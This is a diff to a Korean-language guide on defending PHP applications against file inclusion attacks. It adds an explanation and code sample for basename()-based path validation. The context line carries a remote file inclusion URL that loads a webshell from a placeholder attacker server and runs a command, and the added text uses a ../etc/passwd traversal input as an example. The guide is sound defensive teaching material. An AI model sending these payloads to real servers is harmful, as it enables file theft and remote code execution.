@@ -98,6 +98,23 @@ http://target.com/index.php?file=http://[ATTACKER_SERVER]/webshell.php?cmd=ls
 
 서버 내부의 다른 파일에 접근하기 위해 필요한 ../ 특수문자와 PHP Wrapper(php://, file:// 등)를 필터링한다. 다만, 해당 문자열들만 필터링할 경우 서버의 소스코드 파일은 보호할 수 없어 완벽한 대응 방안은 아니다.
 
+basename() 함수를 사용하여 검증할 수도 있다. basename() 함수는 인자로 받는 파일 경로에서 마지막 구성 요소(파일 이름 또는 디렉터리명)를 반환한다. 따라서, 공격자가 ../../../../../etc/passwd를 입력한다고 하면 앞의 ../../../../../etc/은 제외되고 passwd만 남게 되므로 서버의 상위 디렉터리에 존재하는 파일에 접근하는 것을 막을 수 있다.
+```PHP
+<?php
+    $file = $_GET['file'] ?? '';
+
+    // basename()은 경로에서 파일명 부분만 extractiong한다.
+    // 예: "../../../etc/passwd" -> "passwd"
+    $safe_file = basename($file);
+
+    $filepath = "uploads/" . $safe_file;
+
+    if (file_exists($filepath)) {
+        include($filepath);
+    }
+?>
+```
+
 ## 3.3. 서버 설정 변경 (PHP)
 
 php.ini 파일에서 다음과 같이 설정한다.
